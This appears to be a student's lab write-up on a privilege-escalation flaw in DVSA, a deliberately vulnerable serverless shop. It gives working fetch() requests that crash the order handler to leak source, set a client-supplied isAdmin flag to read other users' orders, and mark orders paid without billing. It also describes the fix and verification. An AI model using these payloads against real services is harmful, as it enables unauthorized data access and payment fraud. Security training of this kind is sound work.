# Lesson 5 — Broken Access Control (Client-Supplied Privilege Flag)

**Student:** Khalid Fahd Aljohani  
**Vulnerability class:** Broken Access Control (OWASP A01:2021)  
**Affected component:** `get_order.py` Lambda — `/var/task/get_order.py` line 32  
**Endpoint:** `POST /dvsa/order`

---

## Summary

The order handler reads `isAdmin` directly from the untrusted request body and uses it to
decide whether to return any user's orders (admin path) or only the caller's own orders (user
path). A standard authenticated user can add `"isAdmin":"true"` to any request and instantly
gain admin-level access.

Combined with Lesson 10: supplying `isAdmin` as a JSON boolean (not string) crashes the
handler and leaks the full Python stack trace including the vulnerable source line.

**Impact:** Any logged-in user can (a) read any other user's orders, (b) mark orders as paid
without going through checkout, and (c) enumerate all orders in the system.

---

## Root Cause

Leaked source line (discovered via the Lesson 10 stack trace):

```python
# /var/task/get_order.py, line 32
is_admin = json.loads(event.get("isAdmin", "false").lower())
```

Three mistakes in one line:
1. **Authorization source is wrong** — reads from attacker-controlled `event.get("isAdmin")`.
2. **No type validation** — `.lower()` crashes on a JSON boolean → stack trace leak (Lesson 10).
3. **Fail-open** — once set, `is_admin=True` allows listing all orders and setting `status="paid"`.

---

## Reproduction Steps

### Step 1 — Register and log in as a standard non-admin user

Open the DVSA website and create a regular account. No admin flag is involved in the signup UI.

### Step 2 — Add an item to cart and start a normal order

```bash
export API="https://<id>.execute-api.us-east-1.amazonaws.com/dvsa/order"
export TOKEN="<your-cognito-jwt>"
```

### Step 3 — Trigger the stack trace to discover the vulnerability (Lesson 10)

Send `isAdmin` as a JSON boolean to crash the handler and read the source code:

```javascript
// Run in browser DevTools Console
fetch("https://<id>.execute-api.us-east-1.amazonaws.com/dvsa/order", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    "Authorization": "<your-jwt>"
  },
  body: JSON.stringify({
    action: "get",
    "order-id": "<any-order-id>",
    isAdmin: false   // boolean, not string — triggers the crash
  })
}).then(r => r.text()).then(console.log);
```

Response (leaks source code):
```json
{
  "errorMessage": "'bool' object has no attribute 'lower'",
  "errorType": "AttributeError",
  "stackTrace": [
    "  File \"/var/task/get_order.py\", line 32, in lambda_handler\n    is_admin = json.loads(event.get(\"isAdmin\", \"false\").lower())"
  ]
}
```

### Step 4 — Exploit: escalate to admin using a string value

```javascript
fetch("https://<id>.execute-api.us-east-1.amazonaws.com/dvsa/order", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    "Authorization": "<your-jwt>"
  },
  body: JSON.stringify({
    action: "get",
    "order-id": "<victim-order-id>",
    isAdmin: "true"   // string — bypasses .lower() crash
  })
}).then(r => r.text()).then(console.log);
```

Response: the victim's full order details.

### Step 5 — Mark an order as paid without billing

```javascript
fetch("...", {
  method: "POST",
  headers: { "Content-Type": "application/json", "Authorization": "<jwt>" },
  body: JSON.stringify({
    action: "update",
    "order-id": "<your-own-order-id>",
    items: { "1013": 1 },
    status: "paid",
    isAdmin: "true"
  })
}).then(r => r.text()).then(console.log);
```

Response: `{"status":"ok","order-id":"...","new-status":"paid"}` — checkout bypassed.

---

## Evidence

Screenshots to place in `screenshots/`:
- `5.1-dvsa-signin.png` — signing in as non-admin user
- `5.2-cart-page.png` — normal checkout flow requiring payment
- `5.3-stack-trace-leak.png` — stack trace from isAdmin:false (boolean)
- `5.4-exploit-fetch.png` — DevTools console sending isAdmin:"true"
- `5.5-victim-order-returned.png` — victim's order returned to non-admin
- `5.6-post-fix-rejected.png` — exploit returns "order not found" after fix

---

## Fix

**File:** `/var/task/get_order.py` (and sibling order handler Lambdas)

See [`fix/get_order_fixed.py`](fix/get_order_fixed.py) for the complete fixed handler.

Key changes:
1. Remove `event.get("isAdmin")` — derive `is_admin` from verified Cognito JWT groups instead.
2. Strip `isAdmin` and `status` fields from the request body before dispatch.
3. Wrap the entire handler in `try/except` returning a generic 500 (fixes Lesson 10 simultaneously).

---

## Verification Summary

| Test | Before Fix | After Fix |
|------|-----------|-----------|
| `isAdmin:"true"` privilege escalation | Reads victim's order | Returns "order not found" |
| `status:"paid"` order tampering | Order marked paid | `status` field silently dropped |
| `isAdmin:false` (boolean) crash | 502 + full stack trace | 400 "bad request" |
| Legitimate `action:"orders"` | Works normally | Works identically |

---

## Takeaway

Authentication ≠ Authorization. DVSA verified the JWT (who you are) but let the caller specify
their own privilege level (what they can do). Privilege decisions must always come from
cryptographically verified claims, never from the request body.
